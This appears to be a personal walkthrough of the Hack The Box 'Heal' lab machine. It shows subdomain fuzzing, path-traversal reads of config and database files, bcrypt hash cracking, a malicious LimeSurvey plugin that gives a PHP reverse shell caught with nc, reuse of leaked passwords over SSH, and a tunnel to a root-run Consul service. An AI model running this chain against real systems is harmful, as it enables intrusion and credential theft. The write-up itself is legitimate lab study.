@@ -1,0 +1,339 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.46/ -H "Host: FUZZ.heal.htb" -t 50 --hc 404,301
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.46/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000051:   200        90 L     186 W      12515 Ch    "api"                                               
+
+Total time: 14.61586
+Processed Requests: 19966
+Filtered Requests: 19965
+Requests/sec.: 1366.049
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+This api in our /etc/hosts was the reason the sign up wasnt working.
+Seen by network tab.
+We see on the api page that this is run on Ruby Rails.
+
+
+Logging in we see Survey button
+Powered by LimeSurvey.
+Google tells us this has an /admin page.
+
+Resume GETs from 
+	http://api.heal.htb/download?filename=d68453c725709ffe9344.pdf
+
+
+When making this request we need our cookie/token
+
+──(root㉿kali)-[/home/kali]
+└─# curl 'http://api.heal.htb/download?filename=../../Gemfile'                  
+{"errors":"Invalid token"}                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://api.heal.htb/download?filename=../../Gemfile' -H 'Authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 
+source "https://rubygems.org"
+
+ruby "3.3.5"
+
+# Bundle edge Rails instead: gem "rails", github: "rails/rails", branch: "main"
+gem "rails", "~> 7.1.3", ">= 7.1.3.4"
+
+# Use sqlite3 as the database for Active Record
+gem "sqlite3", "~> 1.4"
+gem 'jwt'
+gem 'bcrypt', '~> 3.1.7'
+gem 'imgkit'
+gem 'rack-cors'
+gem 'rexml'
+
+# Use the Puma web server [https://github.com/puma/puma]
+gem "puma", ">= 5.0"
+
+# Build JSON APIs with ease [https://github.com/rails/jbuilder]
+# gem "jbuilder"
+
+# Use Redis adapter to run Action Cable in production
+# gem "redis", ">= 4.0.1"
+
+# Use Kredis to get higher-level data types in Redis [https://github.com/rails/kredis]
+# gem "kredis"
+
+# Use Active Model has_secure_password [https://guides.rubyonrails.org/active_model_basics.html#securepassword]
+# gem "bcrypt", "~> 3.1.7"
+
+# Windows does not include zoneinfo files, so bundle the tzinfo-data gem
+gem "tzinfo-data", platforms: %i[ windows jruby ]
+
+# Reduces boot times through caching; required in config/boot.rb
+gem "bootsnap", require: false
+
+# Use Active Storage variants [https://guides.rubyonrails.org/active_storage_overview.html#transforming-images]
+# gem "image_processing", "~> 1.2"
+
+# Use Rack CORS for handling Cross-Origin Resource Sharing (CORS), making cross-origin Ajax possible
+# gem "rack-cors"
+
+group :development, :test do
+  # See https://guides.rubyonrails.org/debugging_rails_applications.html#debugging-with-the-debug-gem
+  gem "debug", platforms: %i[ mri windows ]
+end
+
+group :development do
+  # Speed up commands on slow machines / big apps [https://github.com/rails/spring]
+  # gem "spring"
+end
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://api.heal.htb/download?filename=../../config/database.yml' -H 'Authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ'
+# SQLite. Versions 3.8.0 and up are supported.
+#   gem install sqlite3
+#
+#   Ensure the SQLite 3 gem is defined in your Gemfile
+#   gem "sqlite3"
+#
+default: &default
+  adapter: sqlite3
+  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
+  timeout: 5000
+
+development:
+  <<: *default
+  database: storage/development.sqlite3
+
+# Warning: The database defined as "test" will be erased and
+# re-generated from your development database when you run "rake".
+# Do not set this db to the same as development or production.
+test:
+  <<: *default
+  database: storage/test.sqlite3
+
+production:
+  <<: *default
+  database: storage/development.sqlite3
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://api.heal.htb/download?filename=../../config/database.yml' -H 'Authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ'
+# SQLite. Versions 3.8.0 and up are supported.
+#   gem install sqlite3
+#
+#   Ensure the SQLite 3 gem is defined in your Gemfile
+#   gem "sqlite3"
+#
+default: &default
+  adapter: sqlite3
+  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
+  timeout: 5000
+
+development:
+  <<: *default
+  database: storage/development.sqlite3
+
+# Warning: The database defined as "test" will be erased and
+# re-generated from your development database when you run "rake".
+# Do not set this db to the same as development or production.
+test:
+  <<: *default
+  database: storage/test.sqlite3
+
+production:
+  <<: *default
+  database: storage/development.sqlite3
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -H 'Authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -o development.sqlite3
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 32768  100 32768    0     0   385k      0 --:--:-- --:--:-- --:--:--  390k
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# sqlite3 development.sqlite3 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+ar_internal_metadata  token_blacklists    
+schema_migrations     users               
+sqlite> select * from users;
+1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
+sqlite> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+147258369        (?)     
+1g 0:00:00:19 DONE (2025-09-05 08:29) 0.05020g/s 24.39p/s 24.39c/s 24.39C/s 159357..amorcito
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+now we can sign in at 
+http://take-survey.heal.htb/index.php/admin/authentication/sa/login
+(redirect from /admin)
+
+
+"Since LimeSurvey permits administrators to upload and install plugins, we can exploit this
+functionality by uploading a malicious ZIP file with a custom PHP payload to gain a reverse shell.
+We can use this GitHub repository as a reference to build the malicious plugin. Start by cloning the
+repo, then update the php-rev.php file with our listener IP address and port. After that, package
+both the config.xml file and the php-rev.php reverse shell file into a ZIP archive"
+
+
+https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
+
+┌──(root㉿kali)-[/home/kali]
+└─# nano php_revshell.php                                                                                   
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano config.xml            
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# zip Heal.zip php_revshell.php config.xml 
+  adding: php_revshell.php (deflated 61%)
+  adding: config.xml (deflated 56%)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+had to update config.xml to match version, otherwise exploit/writeup would not upload.
+
+
+http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php_revshell.php
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                           
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.46] 41958
+Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 12:44:03 up 39 min,  0 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+linpeas we find
+╔══════════╣ Users with console
+postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
+ron:x:1001:1001:,,,:/home/ron:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+'password' => 'AdmiDi0_pA$$w0rd',
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh ron@heal.htb          
+The authenticity of host 'heal.htb (10.10.11.46)' can't be established.
+ED25519 key fingerprint is SHA256:/VqroO/Kmxq00rboKFY9TylfAkNdJOiWIOBhnIA4VMs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'heal.htb' (ED25519) to the list of known hosts.
+ron@heal.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Sep  5 04:28:30 PM UTC 2025
+
+  System load:           0.08
+  Usage of /:            77.3% of 7.71GB
+  Memory usage:          28%
+  Swap usage:            0%
+  Processes:             250
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.46
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a58f
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+29 updates can be applied immediately.
+18 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+ron@heal:~$ 
+
+
+ron@heal:~$ ss -tnlp
+State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process       
+LISTEN       0            4096                   127.0.0.1:8600                    0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8503                    0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8500                    0.0.0.0:*                        
+LISTEN       0            4096               127.0.0.53%lo:53                      0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8302                    0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8300                    0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8301                    0.0.0.0:*                        
+LISTEN       0            511                    127.0.0.1:3000                    0.0.0.0:*                        
+LISTEN       0            1024                   127.0.0.1:3001                    0.0.0.0:*                        
+LISTEN       0            244                    127.0.0.1:5432                    0.0.0.0:*                        
+LISTEN       0            128                      0.0.0.0:22                      0.0.0.0:*                        
+LISTEN       0            511                      0.0.0.0:80                      0.0.0.0:*                        
+LISTEN       0            128                         [::]:22                         [::]:*                        
+ron@heal:~$ 
+
+lots of Consul ports running
+
+
+"systemd is the standard service manager on modern Linux. It starts services and controls their environment. The unit file is the authoritative definition for how a service runs (User=, ExecStart=, Environment=, etc.)."
+
+
+ron@heal:/etc/systemd$ ls /etc/systemd/system/ | egrep consul
+consul.service
+ron@heal:/etc/systemd$ 
+
+
+
+ron@heal:/etc/systemd$ systemctl show -p User --value consul.service
+root
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -L 8500:127.0.0.1:8500 ron@heal.htb
+
+
+
+
+
+
+
+
+
+
+
+
+
+
